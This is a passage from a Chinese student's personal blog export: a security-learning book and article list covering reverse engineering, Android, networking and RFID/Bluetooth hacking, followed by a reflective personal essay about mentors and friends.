&#160; &#160;《汇编语言编程艺术》&#160; &#160; &#160; &#160;《Windows环境下32位汇编语言程序设计-琢石成器 第3版》&#160; &#160; &#160; &#160;《WINDOWSPE权威指南》&#160; &#160; &#160; &#160;《C++反汇编与逆向分析技术揭秘》&#160; &#160; &#160; &#160;《Windows程序设计》&#160; &#160; &#160; &#160;《逆向工程实战》&#160; &#160; &#160; &#160;《逆向工程核心原理 》&#160; &#160; &#160; &#160;《逆向工程揭密/安全技术大系中文版》&#160; &#160; &#160; &#160;《Malware analyst’s cookbook》&#160; &#160; &#160; &#160;《Python灰帽子：黑客与逆向工程师的Python编程之道》 · 进阶类&#160; &#160; &#160; &#160;《加密与解密》&#160; &#160; &#160; &#160;《Windows PE权威指南》&#160; &#160; &#160; &#160;《恶意代码分析实战》&#160; &#160; &#160; &#160;《0day安全软件漏洞分析技术》&#160; &#160; &#160; &#160;《数据结构》（严蔚敏著） Android 方向：· 开发&#160; &#160; &#160; &#160;《疯狂JAVA讲义》&#160; &#160; &#160; &#160;《疯狂Android讲义》&#160; &#160; &#160; &#160;《第一行代码-Android》&#160; &#160; &#160; &#160;《Android移动开发一本就够了》&#160; &#160; &#160; &#160;《Android基础教程》&#160; &#160; &#160; &#160;《Android C++ 高级编程-使用NDK》&#160; &#160; &#160; &#160;《Android驱动开发权威指南》&#160; &#160; &#160; &#160;《Android软件安全与逆向分析》&#160; &#160; &#160; &#160;《深入理解Android II卷》&#160; &#160; &#160; &#160;《Android安全攻防实战》 Windows&amp;Linux 方向：&#160; &#160; &#160; &#160;《Windows程序设计》&#160; &#160; &#160; &#160;《Windows核心编程》&#160; &#160; &#160; &#160;《寒江独钓Windows内核安全编程》&#160; &#160; &#160; &#160;《鸟哥的linux私房菜基础篇+服务器篇》&#160; &#160; &#160; &#160;《Linux内核精髓》&#160; &#160; &#160; &#160;《深入理解LINUX内核》 网络方向：&#160; &#160; &#160; &#160;《思科网络技术学院教程CCNA Exploration: 网络基础知识》&#160; &#160; &#160; &#160;《思科 网络技术学院教程CCNA Exploration:路由协议和概念》&#160; &#160; &#160; &#160;《图解TCP/IP》&#160; &#160; &#160; &#160;《计算机网络》（Andrew S.Tanenbaum著）&#160; &#160; &#160; &#160;《Wireshark数据包分析实战》&#160; &#160; &#160; &#160;《网络分析技术揭秘》 无线电安全方向：&#160; &#160; &#160; &#160;《无线网络安全攻防实战进阶》&#160; &#160; &#160; &#160;《无线电安全攻防大揭秘》&#160; &#160; &#160; &#160;《射频识别(RFID)核心技术详解》&#160; &#160; &#160; &#160;《黑客大曝光：无线网络安全》&#160; &#160; &#160; &#160;《BackTrack 5 Wireless Penetration Testing Beginner’s Guide》 &#160; &#160; &#160; &#160;文章：（因为图书比较少，遂从某大佬处Get一些比较好的案例分析）&#160; &#160; &#160; &#160;《RFID Hacking ④ : ProxMark3 破解门禁》&#160; &#160; &#160; &#160;《RFID Hacking ③ : ProxMark3 使用案例：嗅探银行闪付卡信息》&#160; &#160; &#160; &#160;《HackRF嗅探蓝牙重放iBeacons信号》&#160; &#160; &#160; &#160;《永不消逝的电波（三）：低功耗蓝牙（BLE）入门之如何调戏别人的小米手环》&#160; &#160; &#160; &#160;《Mousejack Hacking : 利用MouseJack进行物理攻击浅析》&#160; &#160; &#160; &#160;《MouseJack Hacking 测试指南》&#160; &#160; &#160; &#160;《BLE Hacking：使用Ubertoothone扫描嗅探低功耗蓝牙》&#160; &#160; &#160; &#160;《RFID Hacking – 资源大合集》 新技术（容器、云、机器学习相关）：· Docker&#160; &#160; &#160; &#160;《第一本Docker书》&#160; &#160; &#160; &#160;《Docker入门实战》&#160; &#160; &#160; &#160;《Docker容器与容器云》&#160; &#160; &#160; &#160;《Docker开发实践》 · 机器学习&#160; &#160; &#160; &#160;《机器学习》&#160; &#160; &#160; &#160;《深入浅出数据分析》&#160; &#160; &#160; &#160;《啤酒与尿布》&#160; &#160; &#160; &#160;《集体智慧编程》&#160; &#160; &#160; &#160;《统计学习方法》 · 云计算&#160; &#160; &#160; &#160;《云计算：概念、技术与架构》&#160; &#160; &#160; &#160;《深入理解云计算：基本原理和应用程序编程技术》&#160; &#160; &#160; &#160;《云数据中心构建实战：核心技术、运维管理、安全与高可用》&#160; &#160; &#160; &#160;《云计算核心技术剖析》&#160; &#160; &#160; &#160;《实战Hadoop》 另外附上协会wiki","tags":[{"name":"Wiki","slug":"Wiki","permalink":"https://blog.cyris.cn/tags/Wiki/"}]},{"title":"绿生","date":"2017-04-04T08:19:49.000Z","path":"posts/acaleph/","text":"干净，深刻，精致。这是那一刻的绿生，所带给我的欣喜。 一、绿生一直有搭一个个人博客的想法，现在终于做了起来。花了点时间，却也很开心。这里是Cyris的个人小站，他和阅读这篇文字的你们一样，经历和思考着这些那些。前几天和Ak师傅聊了聊，有了些新的想法，也有了下面的这些话。 有事想做的兴奋存一点也不错，干干净净地着手做起来也很棒。把日子过得精致即可。这份精致，也是对生活的一种自信。“我们读诗写诗，非为它的灵巧，我们读诗写诗，因为我们是人类的一员。而人类充满了热情”，对我来说，最有魅力的，还是那些拥有自己的热情的人。这里想提提Acaleph，Aklis以及蔡师傅。 蔡师傅是位地理教师，喜欢穿衬衫，卷袖子。他的课，一卷书，一张嘴，一幅画。他总能很流畅而优美地解释一些枯燥的东西，知识也好，做人也好，很是亲和。夏天吃完午饭，可以看到他靠着阳光在车里睡觉，这对于匆匆赶路的准备高考的我们来说，再棒不过。留点时间给自己。他也普通，也会抱怨，也会醉酒，也会点着烟，即使如此，他的烟味并非毫无营养，并熏染了一片人。他经历了很多我们所不能承受的东西，却也过得安和。某天有幸在路上遇到他，问，要去哪里呢，他说，去看看夫人，就在那边的餐馆里，刚开业，会忙。这让我想起来某节课上，他说，今天女儿要回来，雨大，我想就上半节课，去机场接接她。话后，教室很是安静，这半节课大家听得也很是用心。拍肩是个很简单的动作，但却感动了Cyris很久。平静却深刻的东西，最让人记忆。 在面试以后就没有和Ak师傅聊过了，中间也去过几次协会，那时候刚起步学C和Python，也不知道怎么和满屋的dalao们交流，Ak说，是这样的。很久没聊了，有空过来聊聊吧。有幸遇到Ak师傅。协会的新生测试后又和他聊了聊，讲了讲从开发到学习linux和渗透等方面的东西，虽然只是一个晚上，但Cyris对下面所要做的事，更清晰了点，这站博客，只是第一步。Ak师傅影响Cyris的地方在哪呢？Acaleph说过一句话，大概是，二十岁的人去玩三岁的时候想玩的玩具就没有意义了。Ak师傅可以把知识玩起来。在早先的培训中，他在讲知识的时候，Cyris从他的眼睛里看到了一种很稀有的成分。玩也是一种艺术，能把想玩的东西玩好的人，很棒。Ak说，探求真理者不可心存傲慢。共勉。 首先感谢Acaleph能让Cyris放纵喜欢，从起初的“可以说话的人”到现在各个领域的陪伴，很开心。最早见面的时候Cyris说，她就像早晨四五点的天空，虽然还没有看到具体的光亮，但那种色彩的欲出，让人兴奋不已，并开始期待着这一天，并开始期待着下一天。她有着一份优雅。Cyris很喜欢一句话，“抬头做人，低头做事”，我觉得她正是这样的一个人。她的喜欢与不喜欢很清晰，想要什么很明确，并能很努力地去尝试摘到它。我一直被一些自己不是很喜欢的理念束缚着，比如也会有没写完作业就没什么心情看自己喜欢的书什么的情况，这些都在慢慢改变。时间有限，能多做一点喜欢的事情，挺好。但这也不是一种逃脱的借口，所谓优秀，大概是最快速而质量地完成“其他任务”并精心投入到自己想完成的事中去吧ouo。愿我们都能成为我们所想成为的人。 二、关于我Web初学者，偶尔也会在站内发布一些文字。喜欢听着很舒服的音乐，喜欢动漫，喜欢尝试各种有趣的食物，喜欢自由地思考。如果你有什么有趣的想法，欢迎左转邮箱联系我。 时雨金时，抓住有味。","tags":[{"name":"煮字","slug":"煮字","permalink":"https://blog.cyris.cn/tags/煮字/"}]}]